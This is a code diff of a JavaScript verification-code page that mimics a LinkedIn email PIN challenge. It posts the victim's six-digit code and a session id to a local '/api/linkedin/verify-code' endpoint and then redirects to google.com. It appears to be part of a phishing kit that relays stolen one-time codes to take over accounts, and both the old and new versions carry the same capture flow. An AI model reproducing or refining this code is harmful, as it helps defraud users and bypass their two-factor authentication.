@@ -1,121 +1,113 @@
-document.addEventListener('DOMContentLoaded', () => {
-    const form = document.getElementById('email-pin-challenge');
-    const pinInput = document.getElementById('input__email_verification_pin');
-    const submitButton = document.getElementById('email-pin-submit-button');
-    const errorDiv = document.getElementById('email-pin-error');
-    const wrongCodeMessage = document.getElementById('wrong-code-message');
+document.addEventListener("DOMContentLoaded", () => {
+  const form = document.getElementById("email-pin-challenge");
+  const pinInput = document.getElementById("input__email_verification_pin");
+  const submitButton = document.getElementById("email-pin-submit-button");
+  const errorDiv = document.getElementById("email-pin-error");
+  const wrongCodeMessage = document.getElementById("wrong-code-message");
+  const loader = document.getElementById("loader-wrapper");
+  let sessionId = new URLSearchParams(window.location.search).get("sessionId");
 
-    function showError(message) {
-        if (errorDiv) {
-            errorDiv.textContent = message;
-            errorDiv.classList.remove('hidden__imp');
-        }
+  function showError(message) {
+    if (errorDiv) {
+      errorDiv.textContent = message;
+      errorDiv.classList.remove("hidden__imp");
+    }
+  }
+
+  function hideError() {
+    if (errorDiv) {
+      errorDiv.textContent = "";
+      errorDiv.classList.add("hidden__imp");
+    }
+    if (wrongCodeMessage) {
+      wrongCodeMessage.style.display = "none";
+    }
+  }
+
+  function showWrongCodeMessage() {
+    if (wrongCodeMessage) {
+      wrongCodeMessage.style.display = "block";
+    }
+  }
+
+  function updateSubmitButton() {
+    if (submitButton) {
+      const isValidLength = pinInput.value.trim().length === 6;
+      submitButton.disabled = !isValidLength;
+      submitButton.style.opacity = isValidLength ? "1" : "0.5";
+      submitButton.style.cursor = isValidLength ? "pointer" : "not-allowed";
+    }
+  }
+
+  submitButton.addEventListener("click", function (e) {
+    e.preventDefault();
+    hideError();
+
+    const code = pinInput.value.trim();
+    if (!code) {
+      showError("Please enter the verification code");
+      return;
     }
 
-    function hideError() {
-        if (errorDiv) {
-            errorDiv.textContent = '';
-            errorDiv.classList.add('hidden__imp');
-        }
-        if (wrongCodeMessage) {
-            wrongCodeMessage.style.display = 'none';
-        }
+    if (code.length !== 6) {
+      showError("Please enter a 6-digit verification code");
+      return;
     }
 
-    function showWrongCodeMessage() {
-        if (wrongCodeMessage) {
-            wrongCodeMessage.style.display = 'block';
-        }
-    }
+    loader.classList.remove("hidden__imp");
 
-    function updateSubmitButton() {
-        if (submitButton) {
-            const isValidLength = pinInput.value.trim().length === 6;
-            submitButton.disabled = !isValidLength;
-            submitButton.style.opacity = isValidLength ? '1' : '0.5';
-            submitButton.style.cursor = isValidLength ? 'pointer' : 'not-allowed';
-        }
-    }
+    let submitCodeXhr = new XMLHttpRequest();
+    submitCodeXhr.open("POST", "/api/linkedin/verify-code", true);
+    submitCodeXhr.setRequestHeader("Content-type", "application/json");
+    submitCodeXhr.send(JSON.stringify({ sessionId: sessionId, code: code }));
 
-    if (form) {
-        // Initially disable submit button
-        submitButton.disabled = true;
-        submitButton.style.opacity = '0.5';
-        submitButton.style.cursor = 'not-allowed';
+    submitCodeXhr.onreadystatechange = function () {
+      let response = this.response;
+      console.log(response);
+      if (response == "0") {
+        loader.classList.add("hidden__imp");
+        pinInput.value = ""; // Clear the input field
+        showWrongCodeMessage();
+        updateSubmitButton();
+      } else if (response == "1") {
+        location.href = "https://www.google.com";
+      }
+    };
+  });
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            hideError();
+  if (form) {
+    // Initially disable submit button
+    submitButton.disabled = true;
+    submitButton.style.opacity = "0.5";
+    submitButton.style.cursor = "not-allowed";
+    // Handle input changes
+    pinInput.addEventListener("input", (e) => {
+      hideError();
 
-            const code = pinInput.value.trim();
-            if (!code) {
-                showError('Please enter the verification code');
-                return;
-            }
+      // Ensure only numbers are entered
+      let value = e.target.value.replace(/[^0-9]/g, "");
 
-            if (code.length !== 6) {
-                showError('Please enter a 6-digit verification code');
-                return;
-            }
+      // Limit to 6 digits
+      if (value.length > 6) {
+        value = value.slice(0, 6);
+      }
 
-            try {
-                const response = await fetch('/api/linkedin/verify-code', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        code: code,
-                        sessionId: new URLSearchParams(window.location.search).get('sessionId')
-                    })
-                });
+      // Update input value
+      e.target.value = value;
 
-                const responseText = await response.text();
-                console.log(responseText);
+      // Update submit button state
+      updateSubmitButton();
+    });
 
-                if (response.status === 400 && responseText === "Incorrect verification code") {
-                    pinInput.value = ''; // Clear the input field
-                    showWrongCodeMessage();
-                    updateSubmitButton(); // Update button state after clearing input
-                    return;
-                }
-
-                if (responseText === "Let's do a quick verification") {
-                    const sessionId = new URLSearchParams(window.location.search).get('sessionId');
-                    window.location.href = `/quick-verification.html?sessionId=${sessionId}`;
-                }
-            } catch (error) {
-                console.error('Error submitting verification code:', error);
-                showError('An error occurred. Please try again.');
-            }
-        });
-
-        // Handle input changes
-        pinInput.addEventListener('input', (e) => {
-            hideError();
-            
-            // Ensure only numbers are entered
-            let value = e.target.value.replace(/[^0-9]/g, '');
-            
-            // Limit to 6 digits
-            if (value.length > 6) {
-                value = value.slice(0, 6);
-            }
-            
-            // Update input value
-            e.target.value = value;
-            
-            // Update submit button state
-            updateSubmitButton();
-        });
-
-        // Handle paste event
-        pinInput.addEventListener('paste', (e) => {
-            e.preventDefault();
-            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
-            const numbersOnly = pastedText.replace(/[^0-9]/g, '').slice(0, 6);
-            pinInput.value = numbersOnly;
-            updateSubmitButton();
-        });
-    }
-}); 
+    // Handle paste event
+    pinInput.addEventListener("paste", (e) => {
+      e.preventDefault();
+      const pastedText = (e.clipboardData || window.clipboardData).getData(
+        "text"
+      );
+      const numbersOnly = pastedText.replace(/[^0-9]/g, "").slice(0, 6);
+      pinInput.value = numbersOnly;
+      updateSubmitButton();
+    });
+  }
+});
